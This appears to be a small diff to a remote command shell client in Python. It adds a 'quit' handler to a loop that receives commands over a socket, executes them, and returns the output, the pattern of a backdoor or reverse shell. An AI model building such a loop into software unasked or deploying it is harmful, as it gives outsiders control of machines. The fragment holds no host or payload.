@@ -32,6 +32,9 @@ class Socket:
 		while True:
 
 			command = self.json_receive()
+			if command[0] == 'quit':
+				self.Connection.close()
+				exit()
 			command_output = self.command_execution(command)
 
 			self.json_send(command_output)
